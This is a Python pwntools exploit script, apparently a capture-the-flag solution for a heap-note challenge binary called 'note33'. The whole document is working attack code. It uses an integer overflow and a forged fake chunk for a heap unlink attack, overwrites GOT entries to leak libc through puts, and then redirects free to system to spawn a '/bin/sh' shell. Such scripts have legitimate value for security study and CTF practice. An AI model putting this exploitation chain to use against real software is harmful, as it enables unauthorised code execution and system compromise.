#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']
elf = ELF('./note33')
libc = ELF('libc.so.6')
p=process('./note33')

def create(size, content):
    p.recvuntil('--->>\n')
    p.sendline('1')
    p.recvuntil('1024)\n')
    p.sendline(str(size))
    p.recvuntil('content:\n')
    p.sendline(content)

# def show(index):
#     p.recvuntil('--->>\n')
#     p.sendline('2')
#     p.sendline(str(index))

def edit(index, s):
    p.recvuntil('--->>\n')
    p.sendline('3')
    p.recvuntil('note:\n')
    p.sendline(str(index))
    p.recvuntil('content:\n')
    p.sendline(s)

def delete(index):
    p.recvuntil('--->>\n')
    p.sendline('4')
    p.recvuntil('note:\n')
    p.sendline(str(index))

def debug():
    gdb.attach(p)
    pause()

create(0x0,'123')# 0 整数溢出 无限写入
create(0x20,'789')# 1
create(0x80,'abc')# 2 防止 free 1,1 直接进 top chunk


delete(0)
ptr = 0x6020c8
fd = ptr-0x18
bk = ptr-0x10
fake_chunk = flat(
    'a'*8,0x41,
    fd, bk,
    'a'*0x8*4,
    0x40,0x90
)

create(0x0,fake_chunk)

delete(2)
debug()

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
free_got = elf.got['free']
atoi_got = elf.got['atoi']
# create(0x80,'abc')
payload = b'a'*0x18+p64(free_got)+p64(puts_got)
edit(0,payload)

edit(0,p64(puts_plt)[:-1])

delete(1)

puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.success('puts_addr: ' + hex(puts_addr))
libc.address = puts_addr-libc.sym['puts']
log.success('libc.address: ' + hex(libc.address))
system_addr = libc.sym['system']
log.success('system_addr: ' + hex(system_addr))
binsh_addr = next(libc.search(b'/bin/sh'))
log.success('binsh_addr: ' + hex(binsh_addr))


edit(0,p64(system_addr)[:-1])

create(0x20,'/bin/sh\x00')
delete(1)
p.interactive()
